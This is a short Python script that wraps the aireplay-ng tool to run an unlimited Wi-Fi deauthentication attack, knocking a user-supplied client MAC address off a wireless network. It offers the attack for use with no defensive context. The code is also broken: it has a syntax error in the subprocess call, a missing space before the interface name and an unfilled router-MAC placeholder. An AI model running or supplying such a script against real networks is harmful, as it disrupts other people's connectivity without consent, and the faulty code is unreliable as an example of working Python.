import subprocess

def deauthenticate(mac_address):
    command = "aireplay-ng --deauth 0 -a [router_mac] -c " + mac_address + "wlan0"
    subprocess.run(command.split))

mac_address = input("MAC add:")
deauthenticate(mac_address)
